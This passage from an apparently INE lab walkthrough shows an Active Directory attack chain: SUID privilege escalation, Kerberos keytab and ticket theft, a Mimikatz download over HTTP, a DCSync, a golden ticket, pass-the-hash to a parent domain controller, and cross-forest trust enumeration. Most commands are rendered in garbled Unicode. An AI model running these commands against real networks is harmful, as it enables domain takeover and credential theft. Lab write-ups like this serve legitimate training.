ğ‘’ ğ‘¡ğ‘Ÿğ‘¢ğ‘’<br>run<br></code></pre></div></td></tr></table></figure>

<p>Executing the module results in a bind shell on â€œ<strong>OPS-SRV</strong>â€œ server.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image19.jpeg" srcset="/img/loading.gif"></p>
<p>Interestingly, this machine is domain joined which can be confirmed through the presence of a â€˜/etc/krb5.confâ€™ file or successful execution of the command â€œ<em>kinit -k host/$(hostname -f)</em>â€œ.</p>
<p>With access to the â€œOPS-SRVâ€ machine we will look for any credentials/tickets that can move us forward. After enumeration, a keytab file is located at â€œ<strong>/var/lib/jenkins/support.keytab</strong>â€œ.</p>
<p>But there is a problemâ€¦ We do not have access to the keytab file because it is owned by another user â€˜<strong>opsadmin</strong>â€˜. We need to somehow become opsadmin or get his privileges.</p>
<p>Hopefully, during some priv-esc enumeration, a file named â€œ<strong>find</strong>â€œ was found located atÂ <strong>â€œ/var/lib/jenkins/find</strong>â€œ which has SUID bit set.</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">Check <span class="hljs-keyword">if</span> OPS-SRV is domain joined or not:<br>ğ‘˜ğ‘–ğ‘›ğ‘–ğ‘¡ âˆ’ğ‘˜ â„ğ‘œğ‘ ğ‘¡/$(â„ğ‘œğ‘ ğ‘¡ğ‘›ğ‘ğ‘šğ‘’ âˆ’ğ‘“)<br><br>Keytab <span class="hljs-keyword">file</span> found at:<br><span class="hljs-regexp">/ğ‘£ğ‘ğ‘Ÿ/</span>ğ‘™ğ‘–ğ‘<span class="hljs-regexp">/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ /</span>ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘<br><br>Get opsadmin privileges, SUID check:<br>ğ‘“ğ‘–ğ‘›ğ‘‘ <span class="hljs-regexp">/ âˆ’ğ‘ğ‘’ğ‘Ÿğ‘š âˆ’ğ‘¢=ğ‘  âˆ’ğ‘¡ğ‘¦ğ‘ğ‘’ ğ‘“ 2&gt;/</span>ğ‘‘ğ‘’ğ‘£/ğ‘›ğ‘¢ğ‘™ğ‘™<br>&lt;Result&gt; <span class="hljs-regexp">/ğ’—ğ’‚ğ’“/</span>ğ’ğ’Šğ’ƒ<span class="hljs-regexp">/ğ’‹ğ’†ğ’ğ’Œğ’Šğ’ğ’”/</span>ğ’‡ğ’Šğ’ğ’… &lt;/Result&gt;<br></code></pre></div></td></tr></table></figure>

<p>Using the file â€˜<strong>findâ€™</strong>, we will change the permissions of â€˜<strong>support.keytab</strong>â€˜ file and request a new ticket.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image20.png" srcset="/img/loading.gif"></p>
<p>Escalate to â€œ<strong>opsadmin</strong>â€œ user and request a new TGT for support user, as follows.</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">Escalation to <span class="hljs-string">&quot;opsadmin&quot;</span> user:<br><span class="hljs-regexp">/ğ‘£ğ‘ğ‘Ÿ/</span>ğ‘™ğ‘–ğ‘<span class="hljs-regexp">/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ /</span>ğ‘“ğ‘–ğ‘›ğ‘‘ ğ‘ğ‘ âˆ’ğ‘’ğ‘¥ğ‘’ğ‘ ğ‘â„ğ‘šğ‘œğ‘‘ <span class="hljs-number">777</span> ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘ \;<br><br>Check the permissions of â€œsupport.keytabâ€ <span class="hljs-keyword">file</span>:<br>ğ‘™ğ‘  âˆ’ğ‘™ğ‘ <span class="hljs-regexp">/ğ‘£ğ‘ğ‘Ÿ/</span>ğ‘™ğ‘–ğ‘<span class="hljs-regexp">/ğ‘—ğ‘’ğ‘›ğ‘˜ğ‘–ğ‘›ğ‘ /</span>ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘<br><br>Request <span class="hljs-keyword">for</span> TGT of support user:<br>ğ‘˜ğ‘–ğ‘›ğ‘–ğ‘¡ âˆ’ğ‘˜ âˆ’ğ‘¡ ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡.ğ‘˜ğ‘’ğ‘¦ğ‘¡ğ‘ğ‘ ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡<br></code></pre></div></td></tr></table></figure>

<p>Permissions of â€œ<strong>support.keytab</strong>â€œ file is changed.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image21.png" srcset="/img/loading.gif"></p>
<p>Now, with enough permissions a TGT related to the â€œ<strong>support</strong>â€œ domain user can be easily obtained. Let us now request a CIFS ticket for the â€œ<strong>support</strong>â€œ user, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image22.jpeg" srcset="/img/loading.gif"></p>
<p>To request a CIFS ticket, use the following and export it back to your attacking machine.</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">Request <span class="hljs-keyword">for</span> CIFS Ticket <span class="hljs-keyword">for</span> support user (On OPS-SRV machine):<br>ğ‘˜ğ‘£ğ‘›ğ‘œ ğ‘ğ‘–ğ‘“ğ‘ /\ğ¸ğ¿ğ‘†âˆ’ğ¶ğ»ğ¼ğ¿ğ·ğ·ğ¶<br><br>Convert ticket <span class="hljs-keyword">into</span> base64 (On OPS-SRV machine):<br>ğ‘ğ‘ğ‘ ğ‘’<span class="hljs-number">64</span> <span class="hljs-regexp">/ğ‘¡ğ‘šğ‘/</span>ğ‘˜ğ‘Ÿğ‘<span class="hljs-number">5</span>ğ‘ğ‘_123<br><br><span class="hljs-keyword">Copy</span> base64 data and decode in attacker system (On Attacker Machine):<br>ğ‘ğ‘ğ‘ ğ‘’<span class="hljs-number">64</span> âˆ’ğ‘‘ ğ‘˜ğ‘Ÿğ‘<span class="hljs-number">5</span>ğ‘ğ‘_123_b64 &gt; <span class="hljs-regexp">/ğ‘¡ğ‘šğ‘/</span>ğ‘˜ğ‘Ÿğ‘<span class="hljs-number">5</span>ğ‘ğ‘_123<br><br>Set Environment variable on attacker machine:<br>ğ‘’ğ‘¥ğ‘ğ‘œğ‘Ÿğ‘¡ ğ¾ğ‘…ğµ<span class="hljs-number">5</span>ğ¶ğ¶ğ‘ğ´ğ‘€ğ¸=<span class="hljs-regexp">/ğ‘¡ğ‘šğ‘/</span>ğ‘˜ğ‘Ÿğ‘<span class="hljs-number">5</span>ğ‘ğ‘_123<br></code></pre></div></td></tr></table></figure>

<p>Transferring the ticket using the base64 method and importing it to current environment variable.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image23.jpeg" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>CHILD-DC Server</strong></li>
</ol>
<p>Since we have successfully imported a CIFS ticket related to ELS-CHILDDC in our attacking machine, we can connect to the â€œ<strong>ELS-CHILDDC</strong>â€œ Domain Controller using the ticket. Also, our meterpreter has a route to the â€œ<strong>10.10.2.0/24</strong>â€œ network.</p>
<p>For that we will use impacketâ€™s psexec script, but first we need to add the IP address of ELS-CHILDDC in our hosts file.</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">Open /etc/hosts file:<br>10.10.2.2 ğ¸ğ¿ğ‘†âˆ’ğ¶ğ»ğ¼ğ¿ğ·ğ·ğ¶<br><br>Using Impacketâ€™s psexec module, connect to ELS-CHILDDC<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ğ‘ ğ‘’ğ‘¥ğ‘’ğ‘. ğ‘ğ‘¦ âˆ’ğ‘˜ âˆ’ğ‘›ğ‘œâˆ’ğ‘ğ‘ğ‘ ğ‘  âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.2.2 ğ‘ ğ‘¢ğ‘ğ‘ğ‘œğ‘Ÿğ‘¡@ğ¸ğ¿ğ‘†âˆ’ğ¶ğ»ğ¼ğ¿ğ·ğ·ğ¶<br><br><span class="hljs-symbol">NOTE: </span>â€˜-kâ€™ option to use the active Kerberos ticket<br></code></pre></div></td></tr></table></figure>

<p>In short, we are passing the CIFS ticket to the ELS-CHILDDC server from our attacking machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image24.jpeg" srcset="/img/loading.gif"></p>
<p>This will result in a successful and stable session on the â€˜<strong>ELS-CHILDDC</strong>â€˜ Domain Controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image25.png" srcset="/img/loading.gif"></p>
<p>We will also use the â€œ<strong>PROD-SRV</strong>â€œ server to transfer payload from one end to another. Via the meterpreter session on the â€˜PROD-SRVâ€™ server upload â€œ<strong>Mimikatz.exe</strong>â€œ and from that download the file to â€œ<strong>ELS-CHILDDCâ€</strong>Â server.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">On PROD-SRV meterpreter session, upload Mimikatz.exe:<br>ğ‘¢ğ‘ğ‘™ğ‘œğ‘ğ‘‘ ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’ <span class="hljs-regexp">/ğ‘¡ğ‘šğ‘/</span>ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’<br><br>Start web server to host payload on PROD-SRV server<br>ğ‘ â„ğ‘’ğ‘™ğ‘™<br>ğ‘ğ‘‘ <span class="hljs-regexp">/ğ‘¡ğ‘šğ‘/</span><br>ğ‘™ğ‘  âˆ’ğ‘™ğ‘ ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’<br>ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› âˆ’ğ‘š ğ‘†ğ‘–ğ‘šğ‘ğ‘™ğ‘’ğ»ğ‘‡ğ‘‡ğ‘ƒğ‘†ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ <span class="hljs-number">8888</span><br><br>With Active psexec session on ELS-CHILDDC, download the payload:<br>ğ‘ğ‘œğ‘¤ğ‘’ğ‘Ÿğ‘ â„ğ‘’ğ‘™ğ‘™.ğ‘’ğ‘¥ğ‘’ ğ¼ğ‘›ğ‘£ğ‘œğ‘˜ğ‘’âˆ’ğ‘Šğ‘’ğ‘ğ‘…ğ‘’ğ‘ğ‘¢ğ‘’ğ‘ ğ‘¡ âˆ’ğ‘ˆğ‘…ğ¼ â„ğ‘¡ğ‘¡ğ‘:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">250.2</span>:<span class="hljs-number">8888</span>/ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’ âˆ’ğ‘‚ğ‘¢ğ‘¡ğ¹ğ‘–ğ‘™ğ‘’ ğ¶:\ğ‘ˆğ‘ ğ‘’ğ‘Ÿğ‘ \ğ‘ƒğ‘¢ğ‘ğ‘™ğ‘–ğ‘\ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡.ğ‘’ğ‘¥ğ‘’<br></code></pre></div></td></tr></table></figure>

<p>Upload Mimikatz.exe:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image26.jpeg" srcset="/img/loading.gif"></p>
<p>Start Python server on â€œ<strong>PROD-SRV</strong>â€œ server: -</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image27.png" srcset="/img/loading.gif"></p>
<p>Downloading, Mimikatz.exe on â€œ<strong>ELS-CHILDDC</strong>â€œ Domain Controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image28.jpeg" srcset="/img/loading.gif"></p>
<p>Our payload is successfully transferred to Child Domain Controller. Now let us forge a golden ticket to escalate to Enterprise Admins of the parent domain.</p>
<p>However, we will need, the following:</p>
<ul>
<li><p>  Krbtgt hash of child DC</p>
</li>
<li><p>  Child Domin SID</p>
</li>
<li><p>  Parent Domain SID</p>
</li>
<li><p>  Current Domain FQDN</p>
</li>
</ul>
<p>To extract the krbtgt NTLM hash of the â€œ<strong>els-childdc</strong>â€œ domain, we will perform a DCSync attack.</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">ğ‘šğ‘–ğ‘šğ‘–ğ‘˜ğ‘ğ‘¡ğ‘§.ğ‘’ğ‘¥ğ‘’<br>ğ‘™ğ‘ ğ‘ğ‘‘ğ‘¢ğ‘šğ‘::ğ‘‘ğ‘ğ‘ ğ‘¦ğ‘›ğ‘ /ğ‘¢ğ‘ ğ‘’ğ‘Ÿ:ğ‘’ğ‘™ğ‘ âˆ’ğ‘â„ğ‘–ğ‘™ğ‘‘\ğ‘˜ğ‘Ÿğ‘ğ‘¡ğ‘”ğ‘¡<br><br><span class="hljs-tag">&lt;<span class="hljs-name">Result</span>&gt;</span><br>ğŸğŸğŸğŸ•ğ’‡ğŸ‘ğŸ–ğ’‡ğŸ–ğŸ—ğŸ•ğ’ƒğŸğŸ’ğŸ‘ğŸ–ğ’†ğŸ’ğŸ—ğŸ‘ğ’†ğŸğ’†ğ’†ğŸ“ğŸ–ğ’…ğ’ƒğŸ—ğŸ–ğ’„ğŸ<br><span class="hljs-tag">&lt;/<span class="hljs-name">Result</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>See below the extracted NTLM Hash of â€˜krbtgtâ€™ from the child domain controller. The SID of the child domain can be extracted from the result (without RID part).</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image29.png" srcset="/img/loading.gif"></p>
<p>To enumerate the parent SID value, we can use the Active Directory module already present at the domain controller.</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">In <span class="hljs-keyword">the</span> psexec session, <span class="hljs-keyword">switch</span> <span class="hljs-built_in">to</span> Power Shell:<br>ğ‘ğ‘œğ‘¤ğ‘’ğ‘Ÿğ‘ â„ğ‘’ğ‘™ğ‘™<br>ğ¼ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡âˆ’ğ‘€ğ‘œğ‘‘ğ‘¢ğ‘™ğ‘’ ğ´ğ‘ğ‘¡ğ‘–ğ‘£ğ‘’ğ·ğ‘–ğ‘Ÿğ‘’ğ‘ğ‘¡ğ‘œğ‘Ÿğ‘¦<br><br>Enumerate Domains present <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Forest (most importantly SID <span class="hljs-built_in">value</span> <span class="hljs-keyword">of</span> parent domain):<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ·ğ‘œğ‘šğ‘ğ‘–ğ‘›<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ¹ğ‘œğ‘Ÿğ‘’ğ‘ ğ‘¡<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ·ğ‘œğ‘šğ‘ğ‘–ğ‘› ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘ (ğ‘“ğ‘œğ‘Ÿ ğ‘ ğ‘–ğ‘‘ ğ‘œğ‘“ ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘)<br></code></pre></div></td></tr></table></figure>

<p>SID of Parent Domain Controller [<strong>els.corp</strong>] discovered:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image30.png" srcset="/img/loading.gif"></p>
<p>We have collected all the info needed to perform a golden ticket attack and cross the domain boundary. Letâ€™s use Mimikatz.exe functionality to create and pass a golden ticket.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Create &amp; Pass Golden Ticket:<br>ğ‘˜ğ‘’ğ‘Ÿğ‘ğ‘’ğ‘Ÿğ‘œğ‘ ::ğ‘”ğ‘œğ‘™ğ‘‘ğ‘’ğ‘› <span class="hljs-regexp">/ğ‘¢ğ‘ ğ‘’ğ‘Ÿ:ğ‘’ğ‘™ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› /</span>ğ‘‘ğ‘œğ‘šğ‘ğ‘–ğ‘›:ğ‘’ğ‘™ğ‘ âˆ’ğ‘â„ğ‘–ğ‘™ğ‘‘.ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘ <span class="hljs-regexp">/ğ‘ ğ‘–ğ‘‘:ğ‘†âˆ’1âˆ’5âˆ’21âˆ’3883140795âˆ’789752816âˆ’1587902789 /</span>ğ‘˜ğ‘Ÿğ‘ğ‘¡ğ‘”ğ‘¡:ğŸğŸğŸğŸ•ğ’‡ğŸ‘ğŸ–ğ’‡ğŸ–ğŸ—ğŸ•ğ’ƒğŸğŸ’ğŸ‘ğŸ–ğ’†ğŸ’ğŸ—ğŸ‘ğ’†ğŸğ’†ğ’†ğŸ“ğŸ–ğ’…ğ’ƒğŸ—ğŸ–ğ’„ğŸ <span class="hljs-regexp">/ğ‘ ğ‘–ğ‘‘ğ‘ :ğ‘†âˆ’1âˆ’5âˆ’21âˆ’286056459âˆ’1157968049âˆ’2884264478âˆ’519 /</span>ğ‘¡ğ‘–ğ‘ğ‘˜ğ‘’ğ‘¡:ğ‘¡ğ‘–ğ‘ğ‘˜ğ‘’ğ‘¡.ğ‘˜ğ‘–ğ‘Ÿğ‘ğ‘–<br><br>ğ‘˜ğ‘’ğ‘Ÿğ‘ğ‘’ğ‘Ÿğ‘œğ‘ ::ğ‘ğ‘¡ğ‘¡ ğ‘¡ğ‘–ğ‘ğ‘˜ğ‘’ğ‘¡.ğ‘˜ğ‘–ğ‘Ÿğ‘ğ‘–<br></code></pre></div></td></tr></table></figure>

<p>Golden Ticket:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image31.jpeg" srcset="/img/loading.gif"></p>
<p>Passing the ticket in active Kerberos session:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image32.png" srcset="/img/loading.gif"></p>
<p>To check if the ticket is successfully passed or not, one can always use the â€˜<strong>klist</strong>â€˜ command. Now, we can access resources of the parent domain and request any service ticket.</p>
<p>We will also extract the NTLM hash of the Enterprise Administrator of â€œ<strong>els.corp</strong>â€œ domain (found previously during enumeration activities) using mimikatz.exe</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image33.png" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>ELS-DC Server</strong></li>
</ol>
<p>With the credentials of â€œ<strong>els-adminâ€</strong>Â enterprise admin, we can perform psexec on the parent DC server.</p>
<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">Perform</span> psexec <span class="hljs-literal">on</span> ELS-DC server:<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ğ‘ ğ‘’ğ‘¥ğ‘’ğ‘.ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ <span class="hljs-number">10.10.1.3</span> ğ‘’ğ‘™ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›@ğ¸ğ¿ğ‘†âˆ’ğ·ğ¶ âˆ’â„ğ‘ğ‘ â„ğ‘’ğ‘  ğ‘ğ‘ğ‘‘<span class="hljs-number">3</span>ğ‘<span class="hljs-number">435</span>ğ‘<span class="hljs-number">51404</span>ğ‘’ğ‘’ğ‘ğ‘ğ‘‘<span class="hljs-number">3</span>ğ‘<span class="hljs-number">435</span>ğ‘<span class="hljs-number">51404</span>ğ‘’ğ‘’:<span class="hljs-number">8645</span>ğ‘’<span class="hljs-number">87</span>ğ‘’<span class="hljs-number">2593507</span>ğ‘ğ‘“<span class="hljs-number">623</span>ğ‘“<span class="hljs-number">3291</span>ğ‘<span class="hljs-number">1334</span>ğ‘<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>

<p>â€œNT Authority\Systemâ€ at â€œ<strong>ELS-DC</strong>â€œ parent domain controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image34.png" srcset="/img/loading.gif"></p>
<p>Letâ€™s now use the Active-Directory module to perform some enumeration (for abusing a cross-forest trust later on). Switch to PowerShell and load the AD module to enumerate a forest trust.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Load</span> AD module &amp; <span class="hljs-keyword">perform</span> trust enumeration<br><br>ğ¼ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡âˆ’ğ‘€ğ‘œğ‘‘ğ‘¢ğ‘™ğ‘’ ğ´ğ‘ğ‘¡ğ‘–ğ‘£ğ‘’ğ·ğ‘–ğ‘Ÿğ‘’ğ‘ğ‘¡ğ‘œğ‘Ÿğ‘¦<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘‡ğ‘Ÿğ‘¢ğ‘ ğ‘¡ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ—<br></code></pre></div></td></tr></table></figure>

<p>Output of trust established by the â€œ<strong>els.corp</strong>â€œ domain.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image35.png" srcset="/img/loading.gif"></p>
<p>Another domain â€œ<strong>mgmt.corp</strong>â€œ having a bi-directional trust has been identified in the above result. A Foreign Security Principal can indirectly be used to abuse the cross-forest trust. Letâ€™s enumerate FSPâ€™s available on the identified domain â€œ<strong>mgmt.corp</strong>â€œ.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Enumerate FSPs <span class="hljs-keyword">on</span> mgmt.corp <span class="hljs-keyword">domain</span><br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ &#123;ğ‘œğ‘ğ‘—ğ‘’ğ‘ğ‘¡ğ¶ğ‘™ğ‘ğ‘ ğ‘  âˆ’ğ‘’ğ‘ &quot;ğ‘“ğ‘œğ‘Ÿğ‘’ğ‘–ğ‘”ğ‘›ğ‘†ğ‘’ğ‘ğ‘¢ğ‘Ÿğ‘–ğ‘¡ğ‘¦ğ‘ƒğ‘Ÿğ‘–ğ‘›ğ‘ğ‘–ğ‘ğ‘ğ‘™&quot;&#125; âˆ’ğ‘ ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ ğ‘šğ‘”ğ‘šğ‘¡.ğ‘ğ‘œğ‘Ÿğ‘<br></code></pre></div></td></tr></table></figure>

<p>A Foreign Security Principal is available on the â€œ<strong>mgmt.corp</strong>â€œ domain, this means a user in the current domain â€œ<strong>els.corp</strong>â€œ is present in the target â€œ<strong>mgmt.corp</strong>â€œ domain:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image36.png" srcset="/img/loading.gif"></p>
<p>Convert the identified user to SID:</p>
<figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">Identify User:<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘ˆğ‘ ğ‘’ğ‘Ÿ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ— |?&#123;$_.ğ‘†ğ¼ğ· âˆ’ğ‘’ğ‘ â€²ğ‘†âˆ’<span class="hljs-number">1</span>âˆ’<span class="hljs-number">5</span>âˆ’<span class="hljs-number">21</span>âˆ’<span class="hljs-number">286056459</span>âˆ’<span class="hljs-number">1157968049</span>âˆ’<span class="hljs-number">2884264478</span>âˆ’<span class="hljs-number">1107</span>â€²&#125;<br></code></pre></div></td></tr></table></figure>

<p>The foreign user can be identified as â€œ<strong>forest_user</strong>â€œ of theÂ <strong>els.corp</strong>Â domain:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image37.png" srcset="/img/loading.gif"></p>
<p>We need to identify the privileges ofÂ <strong>â€œforest_userâ€</strong>Â in theÂ <strong>mgmt.corp</strong>Â domain.</p>
<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">Identify on which group â€˜forest_userâ€™ <span class="hljs-built_in">is</span> added <span class="hljs-built_in">at</span> mgmt.corp <span class="hljs-built_in">domain</span>:<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğºğ‘Ÿğ‘œğ‘¢ğ‘ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ— âˆ’ğ‘ƒğ‘Ÿğ‘œğ‘ğ‘’ğ‘Ÿğ‘¡ğ‘–ğ‘’ğ‘  ğ‘€ğ‘’ğ‘šğ‘ğ‘’ğ‘Ÿ âˆ’ğ‘ ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ ğ‘šğ‘”ğ‘šğ‘¡.ğ‘ğ‘œğ‘Ÿğ‘ |?&#123;$<span class="hljs-symbol">_</span>.ğ‘€ğ‘’ğ‘šğ‘ğ‘’ğ‘Ÿ âˆ’ğ‘šğ‘ğ‘¡ğ‘â„ â€²ğ‘†âˆ’<span class="hljs-number">1</span>âˆ’<span class="hljs-number">5</span>âˆ’<span class="hljs-number">21</span>âˆ’<span class="hljs-number">3658202825</span>âˆ’<span 